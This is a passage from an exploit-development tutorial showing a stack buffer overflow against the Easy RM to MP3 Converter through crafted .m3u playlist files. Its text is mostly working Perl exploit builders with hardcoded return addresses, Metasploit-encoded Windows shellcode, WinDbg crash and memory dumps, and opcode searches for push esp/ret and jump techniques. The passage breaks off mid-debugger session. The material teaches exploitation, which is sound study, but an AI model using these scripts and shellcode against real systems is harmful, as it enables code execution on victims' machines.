ESP   ^\n(=POPPOPRET)                                |      | (2)\n|------|\nESP now poi\nnts here (2)\nWe\u2019ll simulate this with a break and some NOP\u2019s as shellcode, so we can\nsee if our jumps work fine.\nmy $file= \"test1.m3u\";\nmy $junk= \"A\" x 26094;\nmy $eip = pack('V',0x01ab6a10); #pop pop ret from MSRMfilter01.dll\nmy $jmpesp = pack('V',0x01ccf23a); #jmp esp\nmy $prependesp = \"XXXX\";  #add 4 bytes so ESP points at beginning of shellcode b\nytes\nmy $shellcode = \"\\x90\" x 8;  #add more bytes\n$shellcode = $shellcode . $jmpesp;  #address to return via pop pop ret ( = jmp e\nsp)\n$shellcode = $shellcode . \"\\xcc\" . \"\\x90\" x 500;  #real shellcode\nopen($FILE,\">$file\");\nprint $FILE $junk.$eip.$prependesp.$shellcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\n(d08.384): Break instruction exception - code 80000003 (!!! second chance !!!)\neax=90909090 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=000067fe\neip=000ff73c esp=000ff73c ebp=90909090 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0xff72b:\n000ff73c cc              int     3\n0:000> d esp\n000ff73c  cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff74c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff75c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff76c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff77c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff78c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff79c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7ac  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\nCool. that worked.  Now let\u2019s replace the NOPs after jmp esp (ESP+8)\nwith real shellcode (some nops to be sure + shellcode, encoded with\nalpha_upper) (execute calc):\nmy $file= \"test1.m3u\";\nmy $junk= \"A\" x 26094;\nmy $eip = pack('V',0x01ab6a10); #pop pop ret from MSRMfilter01.dll\nmy $jmpesp = pack('V',0x01ccf23a); #jmp esp\nmy $prependesp = \"XXXX\";  #add 4 bytes so ESP points at beginning of shellcode b\nytes\nmy $shellcode = \"\\x90\" x 8;  #add more bytes\n$shellcode = $shellcode . $jmpesp;  #address to return via pop pop ret ( = jmp e\nsp)\n$shellcode = $shellcode . \"\\x90\" x 50;  #real shellcode\n# windows\/exec - 303 bytes\n# http:\/\/www.metasploit.com\n# Encoder: x86\/alpha_upper\n# EXITFUNC=seh, CMD=calc\n$shellcode = $shellcode . \"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\\nx49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nopen($FILE,\">$file\");\nprint $FILE $junk.$eip.$prependesp.$shellcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\n[53]image\npwned !\npush return\npush ret is somewhat similar to call [reg].  If one of the registers is\ndirectly pointing at your shellcode, and if for some reason you cannot\nuse a jmp [reg] to jump to the shellcode, then you could\n* put the address of that register on the stack. It will sit on top\nof the stack.\n* ret  (which will take that address back from the stack and jump to\nit)\nIn order to make this work, you need to overwrite EIP with the address\nof a push [reg] + ret sequence in one of the dll\u2019s.\nSuppose the shellcode is located directly at ESP.  You need to find the\nopcode for \u2018push esp\u2019  and the opcode for \u2018ret\u2019  first\n0:000> a\n000ff7ae push esp\npush esp\n000ff7af ret\nret\n0:000> u 000ff7ae\n+0xff79d:\n000ff7ae 54              push    esp\n000ff7af c3              ret\nopcode sequence is 0x54,0xc3\nSearch for this opcode :\n0:000> s 01a90000 l 01dff000 54 c3\n01aa57f6  54 c3 90 90 90 90 90 90-90 90 8b 44 24 08 85 c0  T..........D$...\n01b31d88  54 c3 fe ff 85 c0 74 5d-53 8b 5c 24 30 57 8d 4c  T.....t]S.\\$0W.L\n01b5cd65  54 c3 8b 87 33 05 00 00-83 f8 06 0f 85 92 01 00  T...3...........\n01b5cf2f  54 c3 8b 4c 24 58 8b c6-5f 5e 5d 5b 64 89 0d 00  T..L$X.._^][d...\n01b5cf44  54 c3 90 90 90 90 90 90-90 90 90 90 8a 81 da 04  T...............\n01bbbb3e  54 c3 8b 4c 24 50 5e 33-c0 5b 64 89 0d 00 00 00  T..L$P^3.[d.....\n01bbbb51  54 c3 90 90 90 90 90 90-90 90 90 90 90 90 90 6a  T..............j\n01bf2aba  54 c3 0c 8b 74 24 20 39-32 73 09 40 83 c2 08 41  T...t$ 92s.@...A\n01c0f6b4  54 c3 b8 0e 00 07 80 8b-4c 24 54 5e 5d 5b 64 89  T.......L$T^][d.\n01c0f6cb  54 c3 90 90 90 64 a1 00-00 00 00 6a ff 68 3b 84  T....d.....j.h;.\n01c692aa  54 c3 90 90 90 90 8b 44-24 04 8b 4c 24 08 8b 54  T......D$..L$..T\n01d35a40  54 c3 c8 3d 10 e4 38 14-7a f9 ce f1 52 15 80 d8  T..=..8.z...R...\n01d4daa7  54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56  T..Mh..\/2......V\n01d55edb  54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56  T..Mh..\/2......V\n01d649c7  54 c3 9f 4d 68 ce ca 2f-32 f2 d5 df 1b 8f fc 56  T..Mh..\/2......V\n01d73406  54 c3 d3 2d d3 c3 3a b3-83 c3 ab b6 b2 c3 0a 20  T..-..:........\n01d74526  54 c3 da 4c 3b 43 11 e7-54 c3 cc 36 bb c3 f8 63  T..L;C..T..6...c\n01d7452e  54 c3 cc 36 bb c3 f8 63-3b 44 d8 00 d1 43 f5 f3  T..6...c;D...C..\n01d74b26  54 c3 ca 63 f0 c2 f7 86-77 42 38 98 92 42 7e 1d  T..c....wB8..B~.\n031d3b18  54 c3 f6 ff 54 c3 f6 ff-4f bd f0 ff 00 6c 9f ff  T...T...O....l..\n031d3b1c  54 c3 f6 ff 4f bd f0 ff-00 6c 9f ff 30 ac d6 ff  T...O....l..0...\nCraft your exploit and run :\nmy $file= \"test1.m3u\";\nmy $junk= \"A\" x 26094;\nmy $eip = pack('V',0x01aa57f6); #overwrite EIP with push esp, ret\nmy $prependesp = \"XXXX\";  #add 4 bytes so ESP points at beginning of shellcode b\nytes\nmy $shellcode = \"\\x90\" x 25;   #start shellcode with some NOPS\n# windows\/exec - 303 bytes\n# http:\/\/www.metasploit.com\n# Encoder: x86\/alpha_upper\n# EXITFUNC=seh, CMD=calc\n$shellcode = $shellcode . \"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\\nx49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nopen($FILE,\">$file\");\nprint $FILE $junk.$eip.$prependesp.$shellcode;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\n[54]image\npwned again !\njmp [reg]+[offset]\nAnother technique to overcome the problem that the shellcode begins at\nan offset of a register (ESP in our example) is by trying to find a jmp\n[reg + offset] instruction (and overwriting EIP with the address of\nthat instruction).  Let\u2019s assume that we need to jump 8 bytes again\n(see previous exercise). Using the jmp reg+offset technique, we would\nsimply jump over the 8 bytes at the beginning of ESP and land directly\nat our shellcode.\nWe need to do 3 things :\n* find the opcode for jmp esp+8h\n* find an address that points to this instruction\n* craft the exploit so it overwrites EIP with this address\nFinding the opcode : use windbg :\n0:014> a\n7c90120e jmp [esp + 8]\njmp [esp + 8]\n7c901212\n0:014> u 7c90120e\nntdll!DbgBreakPoint:\n7c90120e ff642408        jmp     dword ptr [esp+8]\nThe opcode is ff642408\nNow you can search for a dll that has this opcode, and use the address\nto overwrite EIP with.  In our example, I could not find this exact\nopcode anywhere.  Of course, you are not limited to looking for jmp\n[esp+8]\u2026 you could also look for values bigger than 8 (because you\ncontrol anything above 8\u2026 you could easily put some additional NOP\u2019s at\nthe beginning of the shellcode and make the jump into the nop\u2019s\u2026\n(by the way: Opcode for ret is c3. But I\u2019m sure you\u2019ve already figured\nthat our for yourself)\nBlind return\nThis technique is based on the following 2 steps:\n* Overwrite EIP with an address pointing to a ret instruction\n* Hardcode the address of the shellcode at the first 4 bytes of ESP\n* When the ret is execute, the last added 4 bytes (topmost value) are\npopped from the stack and will be put in EIP\n* Exploit jumps to shellcode\nSo this technique is useful if\n* you cannot point EIP to go a register directly (because you cannot\nuse jmp or call instructions. (This means that you need to hardcode\nthe memory address of the start of the shellcode),  but\n* you can control the data at ESP (at least the first 4 bytes)\nIn order to set this up, you need to have the memory address of the\nshellcode (= the address of ESP).  As usual, try to avoid that this\naddress starts with \/ contains null bytes, or you will not be able to\nload your shellcode behind EIP.  If your shellcode can be put at a\nlocation, and this location address does not contain a null byte, then\nthis would be another working technique.\nFind the address of a \u2018ret\u2019 instruction in one of the dll\u2019s.\nSet the first 4 bytes of the shellcode (first 4 bytes of ESP) to the\naddress where the shellcode begins, and overwrite EIP with the address\nof the \u2018ret\u2019 instruction.  From the tests we have done in the first\npart of this tutorial, we remember that ESP seems to start at\n0x000ff730. Of course this address could change on different systems,\nbut if you have no other way than hardcoding addresses, then this is\nthe only thing you can do.\nThis address contains null byte, so when building the payload, we\ncreate a buffer that looks like this :\n[26094 A\u2019s][address of ret][0x000fff730][shellcode]\nThe problem with this example is that the address used to overwrite EIP\ncontains a null byte. (= string terminator), so the shellcode is not\nput in ESP. This is a problem, but it may not be a showstopper.\nSometimes you can find your buffer (look at the first 26094 A\u2019s, not at\nthe ones that are pushed after overwriting EIP, because they will be\nunusable because of null byte) back at other locations\/registers, such\nas eax, ebx, ecx, etc\u2026 In that case, you could try to put the address\nof that register as the first 4 bytes of the shellcode (at the\nbeginning of ESP, so directly after overwriting EIP), and still\noverwrite EIP with the address of a \u2018ret\u2019 instruction.\nThis is a technique that has a lot of requirements and drawbacks, but\nit only requires a \u201cret\u201d instruction\u2026  Anyways, it didn\u2019t really work\nfor Easy RM to MP3.\nDealing with small buffers : jumping anywhere with custom jumpcode\nWe have talked about various ways to make EIP jump to our shellcode. In\nall scenario\u2019s, we have had the luxury to be able to put this shellcode\nin one piece in the buffer. But what if we see that we don\u2019t have\nenough space to host the entire shellcode ?\nIn our exercise, we have been using 26094 bytes before overwriting EIP,\nand we have noticed that ESP points to 26094+4 bytes, and that we have\nplenty of space from that point forward. But what if we only had 50\nbytes (ESP -> ESP+50 bytes). What if our tests showed that everything\nthat was written after those 50 bytes were not usable ?  50 bytes for\nhosting shellcode is not a lot.  So we need to find a way around that.\nSo perhaps we can use the 26094 bytes that were used to trigger the\nactual overflow.\nFirst, we need to find these 26094 bytes somewhere in memory. If we\ncannot find them anywhere, it\u2019s going to be difficult to reference\nthem.  In fact, if we can find these bytes and find out that we have\nanother register pointing (or almost pointing) at these bytes, it may\neven be quite easy to put our shellcode in there.\nIf you run some basic tests against Easy RM to MP3, you will notice\nthat parts of the 26094 bytes are also visible in the ESP dump  :\nmy $file= \"test1.m3u\";\nmy $junk= \"A\" x 26094;\nmy $eip = \"BBBB\";\nmy $preshellcode = \"X\" x 54;  #let's pretend this is the only space we have avai\nlable\nmy $nop = \"\\x90\" x 230;  #added some nops to visually separate our 54 X's from o\nther data\nopen($FILE,\">$file\");\nprint $FILE $junk.$eip.$preshellcode.$nop;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nAfter opening the test1.m3u file, we get this :\neax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715\neip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0x42424231:\n42424242 ??              ???\n0:000> d esp\n000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff740  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff750  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff760  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............\n000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d\n000ff7b0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7c0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7d0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7e0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7f0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff800  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff810  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff820  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d\n000ff830  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff840  90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41  .........AAAAAAA\n000ff850  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff860  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff870  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\nWe can see our 50 X\u2019s at ESP.  Let\u2019s pretend this is the only space\navailable for shellcode (we think).  However, when we look further down\nthe stack, we can find back A\u2019s starting from address 000ff849\n(=ESP+281).\nWhen we look at other registers, there\u2019s no trace of X\u2019s or A\u2019s. (You\ncan just dump the registers, or look for a number of A\u2019s in memory.\nSo this is it.  We can jump to ESP to execute some code, but we only\nhave 50 bytes to spend on shellcode.  We also see other parts of our\nbuffer at a lower position in the stack\u2026 in fact, when we continue to\ndump the contents of ESP, we have a huge buffer filled with A\u2019s\u2026\n[55]image\nLuckily there is a way to host the shellcode in the A\u2019s and use the X\u2019s\nto jump to the A\u2019s. In order to make this happen, we need a couple of\nthings\n* The position inside the buffer with 26094 A\u2019s that is now part of\nESP, at 000ff849 (\u201cWhere do the A\u2019s shown in ESP really start ?)\n(so if we want to put our shellcode inside the A\u2019s, we need to know\nwhere exactly it needs to be put)\n* \u201cJumpcode\u201d : code that will make the jump from the X\u2019s to the A\u2019s.\nThis code cannot be larger than 50 bytes (because that\u2019s all we\nhave available directly at ESP)\nWe can find the exact position by using guesswork, by using custom\npatterns, or by using one of metasploits patterns.\nWe\u2019ll use one of metasploit\u2019s patterns\u2026  we\u2019ll start with a small one\n(so if we are looking at the start of the A\u2019s, then we would not have\nto work with large amount of character patterns :-) )\nGenerate a pattern of let\u2019s say 1000 characters, and replace the first\n1000 characters in the perl script with the pattern (and then add 25101\nA\u2019s)\nmy $file= \"test1.m3u\";\nmy $pattern = \"Aa0Aa1Aa2Aa3Aa4Aa....g8Bg9Bh0Bh1Bh2B\";\nmy $junk= \"A\" x 25101;\nmy $eip = \"BBBB\";\nmy $preshellcode = \"X\" x 54;  #let's pretend this is the only space we have avai\nlable at ESP\nmy $nop = \"\\x90\" x 230;  #added some nops to visually separate our 54 X's from o\nther data in the ESP dump\nopen($FILE,\">$file\");\nprint $FILE $pattern.$junk.$eip.$preshellcode.$nop;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\neax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715\neip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0x42424231:\n42424242 ??              ???\n0:000> d esp\n000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff740  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff750  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff760  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............\n000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d\n000ff7b0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7c0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7d0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7e0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7f0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff800  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff810  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff820  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d\n000ff830  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff840  90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37  .........5Ai6Ai7\n000ff850  41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41  Ai8Ai9Aj0Aj1Aj2A\n000ff860  6a 33 41 6a 34 41 6a 35-41 6a 36 41 6a 37 41 6a  j3Aj4Aj5Aj6Aj7Aj\n000ff870  38 41 6a 39 41 6b 30 41-6b 31 41 6b 32 41 6b 33  8Aj9Ak0Ak1Ak2Ak3\n000ff880  41 6b 34 41 6b 35 41 6b-36 41 6b 37 41 6b 38 41  Ak4Ak5Ak6Ak7Ak8A\n000ff890  6b 39 41 6c 30 41 6c 31-41 6c 32 41 6c 33 41 6c  k9Al0Al1Al2Al3Al\n000ff8a0  34 41 6c 35 41 6c 36 41-6c 37 41 6c 38 41 6c 39  4Al5Al6Al7Al8Al9\nWhat we see at 000ff849 is definitely part of the pattern.  The first 4\ncharacters are 5Ai6\n[56]image\nUsing metasploit pattern_offset utility, we see that these 4 characters\nare at offset 257.  So instead of putting 26094 A\u2019s in the file, we\u2019ll\nput 257 A\u2019s, then our shellcode, and fill up the rest of the 26094\ncharacters with A\u2019s again. Or even better, we\u2019ll start with only 250\nA\u2019s, then 50 NOP\u2019s, then our shellcode, and then fill up the rest with\nA\u2019s.  That way, we don\u2019t have to be very specific when jumping\u2026 If we\ncan land in the NOP\u2019s before the shellcode, it will work just fine.\nLet\u2019s see how the script and stack look like when we set this up :\nmy $file= \"test1.m3u\";\nmy $buffersize = 26094;\nmy $junk= \"A\" x 250;\nmy $nop = \"\\x90\" x 50;\nmy $shellcode = \"\\xcc\";\nmy $restofbuffer = \"A\" x ($buffersize-(length($junk)+length($nop)+length($shellc\node)));\nmy $eip = \"BBBB\";\nmy $preshellcode = \"X\" x 54;  #let's pretend this is the only space we have avai\nlable\nmy $nop2 = \"\\x90\" x 230;  #added some nops to visually separate our 54 X's from\nother data\nmy $buffer = $junk.$nop.$shellcode.$restofbuffer;\nprint \"Size of buffer : \".length($buffer).\"\\n\";\nopen($FILE,\">$file\");\nprint $FILE $buffer.$eip.$preshellcode.$nop2;\nclose($FILE);\nprint \"m3u File Created successfully\\n\";\nWhen the application dies, we can see our 50 NOPs  starting at\n000ff848, followed by the shellcode (0x90  at 000ff874), and then again\nfollowed by the A\u2019s.  Ok, that looks fine.\n(188.c98): Access violation - code c0000005 (!!! second chance !!!)\neax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715\neip=42424242 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n+0x42424231:\n42424242 ??              ???\n0:000> d esp\n000ff730  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff740  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff750  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX\n000ff760  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............\n000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d\n000ff7b0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7c0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7d0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7e0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff7f0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff800  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff810  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff820  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:000> d\n000ff830  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff840  90 90 90 90 90 90 90 90-00 90 90 90 90 90 90 90  ................\n000ff850  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff860  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n000ff870  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA\n000ff880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n000ff8a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\nThe second thing we need to do is build our jumpcode that needs to be\nplaced at ESP. The goal of the jumpcode is to jump to ESP+281\nWriting jump code is as easy as writing down the required statements in\nassembly and then translating them to opcode (making sure that we don\u2019t\nhave any null bytes or other restricted characters at the same time)\n:-)\nJumping to ESP+281 would require : Add 281 to the ESP register, and\nthen perform jump esp. 281 = 119h. Don\u2019t try to add everything in one\nshot, or you may end up with opcode that contains null bytes.\nSince we have some flexibility (due to the NOP\u2019s before our shellcode),\nwe don\u2019t have to be very precise either.  As long as we add 281 (or\nmore), it will work.  We have 50 bytes for our jumpcode, but that\nshould not be a problem.\nLet\u2019s add 0x5e  (94) to esp, 3 times. Then do the jump to esp.  The\nassembly commands are :\n* add esp,0x5e\n* add esp,0x5e\n* add esp,0x5e\n* jmp esp\nUsing windbg, we can get the opcode :\n0:014> a\n7c901211 